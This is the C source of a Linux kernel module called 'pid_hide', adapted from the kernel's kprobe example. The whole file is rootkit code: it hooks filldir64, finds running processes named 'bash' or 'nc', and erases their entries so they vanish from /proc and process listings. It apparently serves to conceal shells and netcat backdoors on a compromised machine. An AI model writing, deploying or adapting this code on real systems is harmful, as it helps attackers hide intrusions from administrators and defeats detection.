// SPDX-License-Identifier: GPL-2.0-only
/*
 * https://github.com/torvalds/linux/blob/master/samples/kprobes/kprobe_example.c
 */

#define pr_fmt(fmt) "%s: " fmt, __func__
#define HIDE_CMD1 "bash"
#define HIDE_CMD2 "nc"
#define MAX_PIDS 10

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/kprobes.h>
#include <linux/sched.h>
#include <linux/pid.h>

#ifdef DEBUG
#define dbg_print(fmt, ...) pr_info(fmt, ##__VA_ARGS__)
#else
#define dbg_print(fmt, ...) /* No-op */
#endif

static int *pid_to_hides = NULL;
static int pid_count = 0;

/* For each probe you need to allocate a kprobe structure */
static struct kprobe kp = {
	.symbol_name = "filldir64",
};

/* Check PID */
static bool check_pid(pid_t pid)
{
	for (int i = 0; i < pid_count; i++) {
		if (pid_to_hides[i] == pid)
			return true;
	}
	return false;
}

/* Add PID */
static void add_pid(pid_t pid)
{
	if (pid_count >= MAX_PIDS) {
		dbg_print("PID array is full\n");
		return;
	}

	pid_to_hides[pid_count++] = pid;
	dbg_print("Hiding PID %d: \n", pid);
}

static void scan_pid(void)
{
	struct task_struct *task;

	// Scan all processes running
	for_each_process(task) {
		if (!strncmp(task->comm, HIDE_CMD1, 4) ||
		    !strncmp(task->comm, HIDE_CMD2, 2)) {
			dbg_print("Process found (PID: %d, Name: %s)\n",
				  task->pid, task->comm);

			// Check PID
			if (check_pid(task->pid))
				dbg_print("PID %d already hidden\n", task->pid);
			else
				add_pid(task->pid);
		}
	}
}

/* kprobe pre_handler: called just before the probed instruction is executed */
static int __kprobes handler_pre(struct kprobe *p, struct pt_regs *regs)
{
	char *filename = (char *)regs->si;

	scan_pid();

	// Hide PID
	for (int i = 0; i < pid_count; i++) {
		char pid_name[16];
		snprintf(pid_name, sizeof(pid_name), "%d", pid_to_hides[i]);

		if (strcmp(filename, pid_name) == 0) {
			dbg_print("Hiding PID: %d\n", pid_to_hides[i]);

			memset(filename, 0, strlen(filename));
			return 0;
		}
	}

	return 0;
}

static int __init pid_hide_init(void)
{
	int ret;
	kp.pre_handler = handler_pre;

	pid_to_hides = kmalloc_array(MAX_PIDS, sizeof(int), GFP_KERNEL);
	if (!pid_to_hides) {
		dbg_print("Failed to allocate PID array memory\n");
		return -ENOMEM;
	}

	ret = register_kprobe(&kp);
	if (ret < 0) {
		dbg_print("register_kprobe failed, returned %d\n", ret);
		kfree(pid_to_hides);
		return ret;
	}
	dbg_print("filldir64: %px\n", kp.addr);
	return 0;
}

static void __exit pid_hide_exit(void)
{
	unregister_kprobe(&kp);
	kfree(pid_to_hides);
	dbg_print("pid_hide exit successfully\n");
}

module_init(pid_hide_init) module_exit(pid_hide_exit)
	MODULE_AUTHOR("MikeHorn-git");
MODULE_DESCRIPTION("pid_hide");
MODULE_LICENSE("GPL");
